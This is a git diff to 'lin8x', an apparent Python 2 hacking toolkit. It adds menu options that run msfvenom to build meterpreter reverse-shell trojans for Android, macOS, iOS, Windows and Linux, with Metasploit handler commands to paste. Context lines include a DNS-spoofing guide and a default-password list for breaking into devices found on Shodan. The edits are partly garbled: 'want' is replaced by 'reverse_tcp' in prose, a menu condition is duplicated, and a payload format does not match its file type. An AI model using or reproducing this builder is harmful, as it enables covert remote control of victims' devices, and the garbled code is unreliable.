@@ -113,7 +113,8 @@ print bcolors.red + """ [3] """ + bcolors.blue + """ Device Scanning + Exploitat
 print bcolors.red + """ [4] """ + bcolors.blue + """ Car Scanning """ 
 print bcolors.red + """ [5] """ + bcolors.blue + """ Ghost Mode """
 print bcolors.red + """ [6] """ + bcolors.blue + """ Trojan/Rat Malware Creater """
-print bcolors.red + """ [97] """ + bcolors.blue + """Learn Hacking """ 
+print bcolors.red + """ [96] """ + bcolors.blue + """Learn Hacking """ 
+print bcolors.red + """ [97] """ + bcolors.blue + """Credits """
 print bcolors.red + """ [98] """ + bcolors.blue + """Update Tool """
 print bcolors.red + """ [99] """ + bcolors.blue + """Exit (Or Press "CTRL + C)"\n """
 
@@ -1006,7 +1007,7 @@ iptables part.
 5. Go to the /etc/ettercap/etter.dns file section
 
 6. Replace or reuse the website to ip's for microsoft.com to the website you 
-want to spoof, and your ip.
+reverse_tcp to spoof, and your ip.
 
 (E.g: facebook.com A 1.1.1.1)
 
@@ -1189,7 +1190,7 @@ Hostname: (e.g hostname:facebook.com)
 Operating System: (e.g microsoft os:windows)
 After filtering your searches, you can click on the specific device in the lists by clicking on them, the stuff that shall most likley be included with it are:
 the IP address, latitude and londitude, SHH and HTTP settings, and server name.
-After using this information to find the right device you want to get into, just click on the ip or just do a basic search in the searchbar. However, alot of devices may be blocked with a username and a password. Luckily for you, most usernames and passwords are set to default. This means that things such as (Username:Password)
+After using this information to find the right device you reverse_tcp to get into, just click on the ip or just do a basic search in the searchbar. However, alot of devices may be blocked with a username and a password. Luckily for you, most usernames and passwords are set to default. This means that things such as (Username:Password)
 Admin:Admin
 Admin:12345
 Admin:54321
@@ -1459,6 +1460,19 @@ elif answer == "6":
               :____________________________:
 """
     
+    print bcolors.green + """
+The Difference Between all Reverse Shell Types:
+
+reverse_tcp = Basic Attack/Rat, connection is shown towards you and the attacker's
+IP
+
+reverse_https = Basic Attack/Rat, makes it look like encrypted website requests 
+and communication
+
+reverse_http = Basic Attack/Rat, makes it look like unencrypted website requests 
+and communication
+"""
+
     print bcolors.red + """[1]""" + bcolors.blue + """  Android"""
     print bcolors.red + """[2]""" + bcolors.blue + """  Mac OS / iOS"""
     print bcolors.red + """[3]""" + bcolors.blue + """  Windows (XP - 10)"""
@@ -1510,7 +1524,9 @@ elif answer == "6":
    | [_=
 """
      
-        print bcolors.red + """[1]""" + bcolors.blue + """  Create a Basic Trojan (WAN, .apk)"""
+        print bcolors.red + """[1]""" + bcolors.blue + """  Create a Basic Trojan (reverse_tcp, .apk)"""
+        print bcolors.red + """[2]""" + bcolors.blue + """  Create a Basic Trojan (reverse_https, .apk)"""
+        print bcolors.red + """[3]""" + bcolors.blue + """  Create a Basic Trojan (reverse_http, .apk)"""
         print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu"""
 
         print ""
@@ -1526,7 +1542,7 @@ elif answer == "6":
             clearScr()
             print bcolors.red + """############################################################
 """
-            print bcolors.yellow + """You are now making a Android Trojan through WAN...
+            print bcolors.yellow + """You are now making a Android Trojan through reverse_tcp...
 Please answer all parts correctly.
 
 (DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
@@ -1579,6 +1595,132 @@ Ill do it later.
                 subprocess.call(["python", "lin8x.py"])
         if v1 == '99':
             subprocess.call(["python", "lin8x.py"])
+
+        if v1 == '2':
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.yellow + """You are now making a Android Trojan through reverse_https...
+Please answer all parts correctly.
+
+(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
+OR " - " INSTEAD!)
+
+YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!
+
+(Press Ctrl + C To Exit!)
+"""           
+
+            print bcolors.red + """############################################################
+"""
+            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
+            lport1 = raw_input(bcolors.yellow + "LPORT: ")
+            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
+            os.system("""msfvenom -p android/meterpreter/reverse_https LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ R > /root/Desktop/""" + name1 + """.apk""")
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.red + """
+Please do the following commands in metasploit:"""
+            print bcolors.white + """
+use exploit/multi/handler
+set payload android/meterpreter/reverse_https
+set lhost """ + lhost1
+            print bcolors.white + """set lport """ + lport1
+            print bcolors.white + """exploit"""
+            print bcolors.red + """Feel free to Copy and Paste!
+"""
+
+            print bcolors.red + """############################################################
+"""
+
+            print bcolors.yellow + """
+Would you like to use the payload right now?
+"""
+            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
+            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
+Ill do it later.
+"""
+   
+            idk = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
+            if idk == '1':
+                os.system('msfconsole')
+                subprocess.call(["python", "lin8x.py"])
+
+            if idk == '2':
+                subprocess.call(["python", "lin8x.py"])
+        if v1 == '99':
+            subprocess.call(["python", "lin8x.py"])
+
+
+        if v1 == '2':
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.yellow + """You are now making a Android Trojan through reverse_http...
+Please answer all parts correctly.
+
+(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
+OR " - " INSTEAD!)
+
+YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!
+
+(Press Ctrl + C To Exit!)
+"""           
+
+            print bcolors.red + """############################################################
+"""
+            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
+            lport1 = raw_input(bcolors.yellow + "LPORT: ")
+            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
+            os.system("""msfvenom -p android/meterpreter/reverse_http LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ R > /root/Desktop/""" + name1 + """.apk""")
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.red + """
+Please do the following commands in metasploit:"""
+            print bcolors.white + """
+use exploit/multi/handler
+set payload android/meterpreter/reverse_http
+set lhost """ + lhost1
+            print bcolors.white + """set lport """ + lport1
+            print bcolors.white + """exploit"""
+            print bcolors.red + """Feel free to Copy and Paste!
+"""
+
+            print bcolors.red + """############################################################
+"""
+
+            print bcolors.yellow + """
+Would you like to use the payload right now?
+"""
+            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
+            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
+Ill do it later.
+"""
+   
+            idk = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
+            if idk == '1':
+                os.system('msfconsole')
+                subprocess.call(["python", "lin8x.py"])
+
+            if idk == '2':
+                subprocess.call(["python", "lin8x.py"])
+        if v1 == '99':
+            subprocess.call(["python", "lin8x.py"])
+
 ############################################################
 
     if v == '2':
@@ -1626,9 +1768,13 @@ Ill do it later.
 ..................DDDDDDN..........,NDDDDDN ......  ....... 
 """
      
-        print bcolors.red + """[1]""" + bcolors.blue + """  Create a Basic Trojan (WAN, .macho) (Mac OS)"""
-        print bcolors.red + """[2]""" + bcolors.blue + """  Create a Basic Trojan (WAN, .macho) (iOS)"""
-        print bcolors.red + """[3]""" + bcolors.blue + """  Create a Basic Trojan (WAN, .py)"""
+        print bcolors.red + """[1]""" + bcolors.blue + """  Create a Basic Trojan (reverse_tcp, .macho / Mac OS)"""
+        print bcolors.red + """[2]""" + bcolors.blue + """  Create a Basic Trojan (reverse_tcp, .macho / iOS)"""
+        print bcolors.red + """[3]""" + bcolors.blue + """  Create a Basic Trojan (reverse_tcp, .py)"""
+        print bcolors.red + """[4]""" + bcolors.blue + """  Create a Basic Trojan (reverse_https, .macho / Mac OS)"""
+        print bcolors.red + """[5]""" + bcolors.blue + """  Create a Basic Trojan (reverse_https, .macho / iOS)"""
+        print bcolors.red + """[6]""" + bcolors.blue + """  Create a Basic Trojan (reverse_https, .py)"""
+        print bcolors.red + """[7]""" + bcolors.blue + """  Create a Basic Trojan (reverse_https, .dmg / Mac OS)"""
         print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu"""
 
         print ""
@@ -1644,7 +1790,7 @@ Ill do it later.
             clearScr()
             print bcolors.red + """############################################################
 """
-            print bcolors.yellow + """You are now making a Mac OS Trojan through WAN...
+            print bcolors.yellow + """You are now making a Mac OS Trojan through reverse_tcp...
 Please answer all parts correctly.
 
 (DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
@@ -1704,7 +1850,7 @@ Ill do it later.
             clearScr()
             print bcolors.red + """############################################################
 """
-            print bcolors.yellow + """You are now making a iOS Trojan through WAN...
+            print bcolors.yellow + """You are now making a iOS Trojan through reverse_tcp...
 Please answer all parts correctly.
 
 (DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
@@ -1759,7 +1905,7 @@ Ill do it later.
 
 
 
-        if v2 == '2':
+        if v2 == '3':
             clearScr()
             clearScr()
             clearScr()
@@ -1767,7 +1913,7 @@ Ill do it later.
             clearScr()
             print bcolors.red + """############################################################
 """
-            print bcolors.yellow + """You are now making a Mac OS / Python Trojan through WAN...
+            print bcolors.yellow + """You are now making a Mac OS / Python Trojan through reverse_tcp...
 Please answer all parts correctly.
 
 (DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
@@ -1819,6 +1965,250 @@ Ill do it later.
             if idk2a == '2':
                 subprocess.call(["python", "lin8x.py"])
 
+
+        if v2 == '4':
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.yellow + """You are now making a Mac OS Trojan through reverse_https...
+Please answer all parts correctly.
+
+(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
+OR " - " INSTEAD!)
+
+YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!
+
+(Press Ctrl + C To Exit!)
+"""           
+
+            print bcolors.red + """############################################################
+"""
+            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
+            lport1 = raw_input(bcolors.yellow + "LPORT: ")
+            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
+            os.system("""msfvenom -p osx/meterpreter/reverse_https LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f macho > /root/Desktop/""" + name1 + """.macho""")
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.red + """
+Please do the following commands in metasploit:"""
+            print bcolors.white + """
+use exploit/multi/handler
+set payload osx/meterpreter/reverse_https
+set lhost """ + lhost1
+            print bcolors.white + """set lport """ + lport1
+            print bcolors.white + """exploit"""
+            print bcolors.red + """Feel free to Copy and Paste!
+"""
+
+            print bcolors.red + """############################################################
+"""
+
+            print bcolors.yellow + """
+Would you like to use the payload right now?
+"""
+            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
+            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
+Ill do it later.
+"""
+   
+            idk2 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
+            if idk2 == '1':
+                os.system('msfconsole')
+                subprocess.call(["python", "lin8x.py"])
+
+            if idk2 == '2':
+                subprocess.call(["python", "lin8x.py"])
+
+        if v2 == '5':
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.yellow + """You are now making a iOS Trojan through reverse_https...
+Please answer all parts correctly.
+
+(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
+OR " - " INSTEAD!)
+
+YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!
+
+(Press Ctrl + C To Exit!)
+"""           
+
+            print bcolors.red + """############################################################
+"""
+            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
+            lport1 = raw_input(bcolors.yellow + "LPORT: ")
+            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
+            os.system("""msfvenom -p apple_ios/aarch64/meterpreter_reverse_https LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f macho > /root/Desktop/""" + name1 + """.macho""")
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.red + """
+Please do the following commands in metasploit:"""
+            print bcolors.white + """
+use exploit/multi/handler
+set payload apple_ios/aarch64/meterpreter_reverse_https
+set lhost """ + lhost1
+            print bcolors.white + """set lport """ + lport1
+            print bcolors.white + """exploit"""
+            print bcolors.red + """Feel free to Copy and Paste!
+"""
+
+            print bcolors.red + """############################################################
+"""
+
+            print bcolors.yellow + """
+Would you like to use the payload right now?
+"""
+            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
+            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
+Ill do it later.
+"""
+   
+            idk2 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
+            if idk2 == '1':
+                os.system('msfconsole')
+                subprocess.call(["python", "lin8x.py"])
+
+            if idk2 == '2':
+                subprocess.call(["python", "lin8x.py"])
+
+
+        if v2 == '6':
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.yellow + """You are now making a Mac OS / Python Trojan through reverse_https...
+Please answer all parts correctly.
+
+(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
+OR " - " INSTEAD!)
+
+YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!
+
+(Press Ctrl + C To Exit!)
+"""           
+
+            print bcolors.red + """############################################################
+"""
+            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
+            lport1 = raw_input(bcolors.yellow + "LPORT: ")
+            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
+            os.system("""msfvenom -p python/meterpreter/reverse_https LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f elf > /root/Desktop/""" + name1 + """.py""")
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.red + """
+Please do the following commands in metasploit:"""
+            print bcolors.white + """
+use exploit/multi/handler
+set payload python/meterpreter/reverse_https
+set lhost """ + lhost1
+            print bcolors.white + """set lport """ + lport1
+            print bcolors.white + """exploit"""
+            print bcolors.red + """Feel free to Copy and Paste!
+"""
+
+            print bcolors.red + """############################################################
+"""
+
+            print bcolors.yellow + """
+Would you like to use the payload right now?
+"""
+            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
+            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
+Ill do it later.
+"""
+   
+            idk2a = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
+            if idk2a == '1':
+                os.system('msfconsole')
+                subprocess.call(["python", "lin8x.py"])
+
+            if idk2a == '2':
+                subprocess.call(["python", "lin8x.py"])
+
+
+        if v2 == '7':
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.yellow + """You are now making a Mac OS Trojan through reverse_https...
+Please answer all parts correctly.
+
+(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
+OR " - " INSTEAD!)
+
+YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!
+
+(Press Ctrl + C To Exit!)
+"""           
+
+            print bcolors.red + """############################################################
+"""
+            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
+            lport1 = raw_input(bcolors.yellow + "LPORT: ")
+            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
+            os.system("""msfvenom -p osx/meterpreter/reverse_https LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f dmg > /root/Desktop/""" + name1 + """.dmg""")
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.red + """
+Please do the following commands in metasploit:"""
+            print bcolors.white + """
+use exploit/multi/handler
+set payload osx/meterpreter/reverse_https
+set lhost """ + lhost1
+            print bcolors.white + """set lport """ + lport1
+            print bcolors.white + """exploit"""
+            print bcolors.red + """Feel free to Copy and Paste!
+"""
+
+            print bcolors.red + """############################################################
+"""
+
+            print bcolors.yellow + """
+Would you like to use the payload right now?
+"""
+            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
+            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
+Ill do it later.
+"""
+   
+            idk2 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
+            if idk2 == '1':
+                os.system('msfconsole')
+                subprocess.call(["python", "lin8x.py"])
+
+            if idk2 == '2':
+                subprocess.call(["python", "lin8x.py"])
+
+
         if v2 == '99':
             subprocess.call(["python", "lin8x.py"])
 
@@ -1862,7 +2252,10 @@ Ill do it later.
 `---._.-------------------------------------------------------------._.---'
 """
      
-        print bcolors.red + """[1]""" + bcolors.blue + """  Create a Basic Trojan (WAN, .exe)"""
+        print bcolors.red + """[1]""" + bcolors.blue + """  Create a Basic Trojan (reverse_tcp, .exe)"""
+        print bcolors.red + """[2]""" + bcolors.blue + """  Create a Basic Trojan (reverse_https, .exe)"""
+        print bcolors.red + """[3]""" + bcolors.blue + """  Create a Basic Trojan (reverse_http, .exe)"""
+        print bcolors.red + """[4]""" + bcolors.blue + """  Create a Basic Trojan (reverse_tcp, .rar)"""
         print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu"""
 
         print ""
@@ -1878,7 +2271,7 @@ Ill do it later.
             clearScr()
             print bcolors.red + """############################################################
 """
-            print bcolors.yellow + """You are now making a Windows Trojan through WAN...
+            print bcolors.yellow + """You are now making a Windows Trojan through reverse_tcp...
 Please answer all parts correctly.
 
 (DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
@@ -1895,6 +2288,183 @@ YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!
             lport1 = raw_input(bcolors.yellow + "LPORT: ")
             name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
             os.system("""msfvenom -p windows/meterpreter/reverse_tcp LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f exe > /root/Desktop/""" + name1 + """.exe""")
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.red + """
+Please do the following commands in metasploit:"""
+            print bcolors.white + """
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost """ + lhost1
+            print bcolors.white + """set lport """ + lport1
+            print bcolors.white + """exploit"""
+            print bcolors.red + """Feel free to Copy and Paste!
+"""
+
+            print bcolors.red + """############################################################
+"""
+
+            print bcolors.yellow + """
+Would you like to use the payload right now?
+"""
+            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
+            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
+Ill do it later.
+"""
+   
+            idk3 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
+            if idk3 == '1':
+                os.system('msfconsole')
+                subprocess.call(["python", "lin8x.py"])
+
+            if idk3 == '2':
+                subprocess.call(["python", "lin8x.py"])
+        if v3 == '2':
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.yellow + """You are now making a Windows Trojan through reverse_https...
+Please answer all parts correctly.
+
+(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
+OR " - " INSTEAD!)
+
+YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!
+
+(Press Ctrl + C To Exit!)
+"""           
+
+            print bcolors.red + """############################################################
+"""
+            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
+            lport1 = raw_input(bcolors.yellow + "LPORT: ")
+            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
+            os.system("""msfvenom -p windows/meterpreter/reverse_https LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f exe > /root/Desktop/""" + name1 + """.exe""")
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.red + """
+Please do the following commands in metasploit:"""
+            print bcolors.white + """
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set lhost """ + lhost1
+            print bcolors.white + """set lport """ + lport1
+            print bcolors.white + """exploit"""
+            print bcolors.red + """Feel free to Copy and Paste!
+"""
+
+            print bcolors.red + """############################################################
+"""
+
+            print bcolors.yellow + """
+Would you like to use the payload right now?
+"""
+            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
+            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
+Ill do it later.
+"""
+   
+            idk3 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
+            if idk3 == '1':
+                os.system('msfconsole')
+                subprocess.call(["python", "lin8x.py"])
+
+            if idk3 == '2':
+                subprocess.call(["python", "lin8x.py"])
+        if v3 == '3':
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.yellow + """You are now making a Windows Trojan through reverse_http...
+Please answer all parts correctly.
+
+(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
+OR " - " INSTEAD!)
+
+YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!
+
+(Press Ctrl + C To Exit!)
+"""           
+
+            print bcolors.red + """############################################################
+"""
+            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
+            lport1 = raw_input(bcolors.yellow + "LPORT: ")
+            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
+            os.system("""msfvenom -p windows/meterpreter/reverse_http LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f exe > /root/Desktop/""" + name1 + """.exe""")
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.red + """
+Please do the following commands in metasploit:"""
+            print bcolors.white + """
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_http
+set lhost """ + lhost1
+            print bcolors.white + """set lport """ + lport1
+            print bcolors.white + """exploit"""
+            print bcolors.red + """Feel free to Copy and Paste!
+"""
+
+            print bcolors.red + """############################################################
+"""
+
+            print bcolors.yellow + """
+Would you like to use the payload right now?
+"""
+            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
+            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
+Ill do it later.
+"""
+   
+            idk3 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
+            if idk3 == '1':
+                os.system('msfconsole')
+                subprocess.call(["python", "lin8x.py"])
+
+            if idk3 == '2':
+                subprocess.call(["python", "lin8x.py"])
+        if v3 == '4':
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            clearScr()
+            print bcolors.red + """############################################################
+"""
+            print bcolors.yellow + """You are now making a Windows Trojan through reverse_tcp...
+Please answer all parts correctly.
+
+(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
+OR " - " INSTEAD!)
+
+YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!
+
+(Press Ctrl + C To Exit!)
+"""           
+
+            print bcolors.red + """############################################################
+"""
+            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
+            lport1 = raw_input(bcolors.yellow + "LPORT: ")
+            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
+            os.system("""msfvenom -p windows/meterpreter/reverse_tcp LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f rar > /root/Desktop/""" + name1 + """.rar""")
             clearScr()
             clearScr()
             clearScr()
@@ -1941,28 +2511,25 @@ Ill do it later.
         print bcolors.red + """############################################################"""
 
         print bcolors.green + """
-            .-'''-.
-           '       \
-          |,.  ,-.  |
-          |()L( ()| |
-          |,'  `'.| |
-          |.___.',| `
-         .j `--'' `  `.
-        / '        '   \
-       / /          `   `.
-      / /            `    .
-     / /              l   |
-    . ,               |   |
-    ,'`.             .|   |
- _.'   ``.          | `..-'l
-|       `.`,        |      `.
-|         `.    __.j         )
-|__        |--''___|      ,-'
-   `'--...,+''''   `._,.-' mh
-
+	         _nnnn_
+	        dGGGGMMb
+	       @p~qp~~qMb
+	       M|0||0) M|
+	       @,----.JM|
+	      JS^\__/  qKL
+	     dZP        qKRb
+	    dZP          qKKb
+	   fZP            SMMb
+	   HZM            MMMM
+	   FqM            MMMM
+	 __| ".        |\dS"qML
+	 |    `.       | `' \Zq
+	_)      \.___.,|     .'
+	\____   )MMMMMP|   .'
+	     `-'       `--' hjm
 """
      
-        print bcolors.red + """[1]""" + bcolors.blue + """  Create a Basic Trojan (WAN, .exe)"""
+        print bcolors.red + """[1]""" + bcolors.blue + """  Create a Basic Trojan (reverse_tcp, .elf)"""
         print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu"""
 
         print ""
@@ -1978,7 +2545,7 @@ Ill do it later.
             clearScr()
             print bcolors.red + """############################################################
 """
-            print bcolors.yellow + """You are now making a Linux Trojan through WAN...
+            print bcolors.yellow + """You are now making a Linux Trojan through reverse_tcp...
 Please answer all parts correctly.
 
 (DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
@@ -1994,7 +2561,7 @@ YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!
             lhost1 = raw_input(bcolors.yellow + "LHOST: ")
             lport1 = raw_input(bcolors.yellow + "LPORT: ")
             name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
-            os.system("""msfvenom -p windows/meterpreter/reverse_tcp LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f exe > /root/Desktop/""" + name1 + """.exe""")
+            os.system("""msfvenom -p linux/meterpreter/reverse_tcp LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f elf > /root/Desktop/""" + name1 + """.elf""")
             clearScr()
             clearScr()
             clearScr()
@@ -2004,7 +2571,7 @@ YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!
 Please do the following commands in metasploit:"""
             print bcolors.white + """
 use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
+set payload linux/meterpreter/reverse_tcp
 set lhost """ + lhost1
             print bcolors.white + """set lport """ + lport1
             print bcolors.white + """exploit"""
@@ -2038,7 +2605,7 @@ Ill do it later.
 
 ############################################################
 
-elif answer == "97":
+elif answer == "96":
     clearScr()
     clearScr()
     clearScr()
@@ -2059,6 +2626,57 @@ http://www.hackerhighschool.org
     """
     six = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
     if six == '99':
+        subprocess.call(["python", "lin8x.py"])
+
+############################################################
+
+elif answer == "97":
+    clearScr()
+    clearScr()
+    clearScr()
+    clearScr()
+    clearScr()
+    print bcolors.red + """############################################################
+    """
+    print bcolors.green + """
+	         _nnnn_
+	        dGGGGMMb
+	       @p~qp~~qMb
+	       M|^||^) M|
+	       @,----.JM|
+	      JS^\__/  qKL
+	     dZP        qKRb
+	    dZP          qKKb
+	   fZP            SMMb
+	   HZM            MMMM
+	   FqM            MMMM
+	 __| ".        |\dS"qML
+	 |    `.       | `' \Zq
+	_)      \.___.,|     .'
+	\____   )MMMMMP|   .'
+	     `-'       `--' hjm
+"""
+
+    print bcolors.red + """############################################################
+    """
+    
+    print bcolors.white + """          """ + bcolors.underline + """Developer List"""
+    print bcolors.white + bcolors.bold + """
+[Founder & Dev]       AnonymousContent
+[Developer]           iByNiki_
+[Developer]           AnonymousBen
+[Supporter]           Devore07
+[Supporter]           FCCAGut
+"""
+ 
+    print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu
+"""    
+
+    print bcolors.red + """############################################################
+    """
+
+    cr = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
+    if cr == '99':
         subprocess.call(["python", "lin8x.py"])
 
 ############################################################
